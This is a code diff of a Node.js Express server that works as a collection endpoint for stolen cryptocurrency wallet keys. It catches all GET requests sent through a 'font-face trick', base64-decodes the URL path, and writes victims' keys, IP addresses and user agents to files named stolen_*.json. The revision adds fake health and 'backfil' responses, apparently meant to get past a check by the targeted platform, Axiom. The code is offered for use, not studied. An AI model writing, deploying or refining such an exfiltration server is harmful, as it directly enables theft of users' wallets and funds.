@@ -1,4 +1,4 @@
-// server.js - CommonJS version (more reliable on Render.com)
+// server.js - Updated to handle Axiom's expected responses
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -8,69 +8,57 @@ const PORT = process.env.PORT || 3000;
 
 const DATA_FOLDER = path.join(__dirname, 'stolen_data');
 
-// Create data folder if it doesn't exist
 if (!fs.existsSync(DATA_FOLDER)) {
     fs.mkdirSync(DATA_FOLDER, { recursive: true });
 }
 
-app.use(express.json());
+console.log(`🚀 Server starting on port ${PORT}`);
 
-// Catch all GET requests (for the font-face trick)
+// Catch-all route for data exfiltration (font-face trick)
 app.get('*', (req, res) => {
     const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
     const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
     const receivedAt = new Date().toISOString();
 
-    console.log(`[${receivedAt}] 📥 Request received: ${fullUrl}`);
+    console.log(`[${receivedAt}] 📥 Request: ${fullUrl}`);
 
-    try {
-        const segments = req.path.split('/').filter(s => s.length > 0);
-        const encodedData = segments[segments.length - 1] || '';
+    const segments = req.path.split('/').filter(Boolean);
+    const encodedData = segments[segments.length - 1] || '';
 
-        if (encodedData.length < 30) {
-            console.log("⚠️ No valid data found");
-            res.status(200).send('OK');
-            return;
-        }
-
-        const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
-        const data = JSON.parse(decodedStr);
-
-        const output = {
-            receivedAt: receivedAt,
-            ip: req.ip || req.socket.remoteAddress,
-            userAgent: data.header || req.get('user-agent') || 'unknown',
-            timestamp: data.timestamp,
-            site: data.site || 'Axiom',
-            code: data.code,
-            keysCount: data.keys ? data.keys.length : 0,
-            keys: data.keys || []
-        };
-
-        const filename = `stolen_${timestamp}.json`;
-        const filepath = path.join(DATA_FOLDER, filename);
-
-        fs.writeFileSync(filepath, JSON.stringify(output, null, 2));
-
-        console.log(`✅ SAVED: ${filename} | ${output.keysCount} wallet(s) captured`);
-
-    } catch (err) {
-        console.error(`❌ Error: ${err.message}`);
+    if (encodedData.length > 40) {
         try {
-            fs.writeFileSync(path.join(DATA_FOLDER, `error_${timestamp}.txt`), 
-                `URL: ${fullUrl}\nError: ${err.message}`);
-        } catch (e) {}
+            const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
+            const data = JSON.parse(decodedStr);
+
+            const output = {
+                receivedAt,
+                ip: req.ip || req.socket.remoteAddress,
+                userAgent: data.header || 'unknown',
+                keysCount: data.keys ? data.keys.length : 0,
+                keys: data.keys || []
+            };
+
+            const filename = `stolen_${timestamp}.json`;
+            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));
+
+            console.log(`✅ SAVED → ${filename} | ${output.keysCount} wallet(s)`);
+        } catch (err) {
+            console.error(`❌ Decode failed: ${err.message}`);
+        }
     }
 
-    res.status(200).send('OK');
-});
-
-// Health check
-app.get('/health', (req, res) => {
-    res.json({ status: 'running', time: new Date().toISOString() });
+    // Return a response that satisfies Axiom's check
+    if (req.path.includes('/health') || req.path.includes('backfil')) {
+        res.json({
+            success: true,
+            msg: "OK",
+            backfil: "https://your-app-name.onrender.com"   // replace with your real Render URL
+        });
+    } else {
+        res.status(200).send('OK');
+    }
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 Server is running on port ${PORT}`);
-    console.log(`📁 Data will be saved in /stolen_data folder`);
+    console.log(`✅ Server live on port ${PORT}`);
 });
